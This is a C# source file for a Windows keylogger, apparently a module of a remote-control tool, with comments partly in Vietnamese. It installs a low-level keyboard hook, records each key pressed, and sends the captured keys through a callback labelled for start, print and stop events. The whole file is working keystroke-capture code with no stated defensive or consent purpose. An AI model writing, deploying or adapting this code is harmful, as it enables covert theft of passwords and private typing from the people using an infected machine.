using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

public class KeyLogger
{
    public long TimeStamp { get; private set; } = 0;
    private CancellationTokenSource? KeyLoggerCTS;
    private Action<string, object>? SendCallback;

    private readonly List<string> KeyBuffer = new();
    private IntPtr HookId = IntPtr.Zero;
    private NativeMethods.LowLevelKeyboardProc? Proc;

    private readonly object BufferLock = new();

    public void StartKeyLogger(Action<string, object> Callback)
    {
        if (KeyLoggerCTS != null) return;

        SendCallback = Callback;
        KeyLoggerCTS = new CancellationTokenSource();
        var Token = KeyLoggerCTS.Token;

        TimeStamp = DateTimeOffset.Now.ToUnixTimeMilliseconds();

        KeyBuffer.Clear();

        Task.Run(() =>
        {
            var _Thread = new Thread(() =>
            {
                Proc = HookCallback;
                HookId = SetHook(Proc);

                NativeMethods.MSG Message;
                while (!Token.IsCancellationRequested)
                {
                    // Xử lý message loop của hook
                    if (NativeMethods.PeekMessage(out Message, IntPtr.Zero, 0, 0, 1))
                    {
                        NativeMethods.TranslateMessage(ref Message);
                        NativeMethods.DispatchMessage(ref Message);
                    }

                    if (KeyBuffer.Count > 128)
                    {
                        StopKeyLogger();
                        break;
                    }

                    Thread.Sleep(5);
                }

                NativeMethods.UnhookWindowsHookEx(HookId);
            });

            _Thread.SetApartmentState(ApartmentState.STA);
            _Thread.Start();
        }, Token);

        SendCallback?.Invoke("KeyLogger:Start", new
        {
            TimeStamp = TimeStamp,
            Key = new string[] { }
        });
    }

    public void PrintKeyLogger()
    {
        List<string> Copy;

        lock (BufferLock)
        {
            Copy = new List<string>(KeyBuffer);
            KeyBuffer.Clear();
        }

        SendCallback?.Invoke("KeyLogger:Print", new
        {
            TimeStamp = TimeStamp,
            Key = Copy.ToArray()
        });
    }


    public void StopKeyLogger()
    {
        if (KeyLoggerCTS == null) return;

        KeyLoggerCTS.Cancel();
        KeyLoggerCTS = null;

        List<string> Copy;

        lock (BufferLock)
        {
            Copy = new List<string>(KeyBuffer);
            KeyBuffer.Clear();
        }

        SendCallback?.Invoke("KeyLogger:Stop", new
        {
            TimeStamp = TimeStamp,
            Key = Copy.ToArray()
        });
    }

    private IntPtr SetHook(NativeMethods.LowLevelKeyboardProc proc)
    {
        using var curProcess = Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule!;

        return NativeMethods.SetWindowsHookEx(
            13,           // WH_KEYBOARD_LL
            proc,
            NativeMethods.GetModuleHandle(curModule.ModuleName),
            0
        );
    }


    // ───────────────────────────────────────────────────────────────
    // HOOK CALLBACK
    // ───────────────────────────────────────────────────────────────
    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string keyName = ((Keys)vkCode).ToString();

            lock (BufferLock)
            {
                KeyBuffer.Add(keyName);
            }

            PrintKeyLogger();
        }

        return NativeMethods.CallNextHookEx(HookId, nCode, wParam, lParam);
    }
}


// ───────────────────────────────────────────────────────────────
// NativeMethods (giống bạn đang dùng)
// ───────────────────────────────────────────────────────────────
public static class NativeMethods
{
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint threadId);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern bool PeekMessage(out MSG msg, IntPtr hWnd, uint filterMin, uint filterMax, uint flags);

    [DllImport("user32.dll")]
    public static extern bool TranslateMessage(ref MSG lpMsg);

    [DllImport("user32.dll")]
    public static extern IntPtr DispatchMessage(ref MSG lpMsg);

    public struct MSG { public IntPtr hWnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int pt_x; public int pt_y; }
}
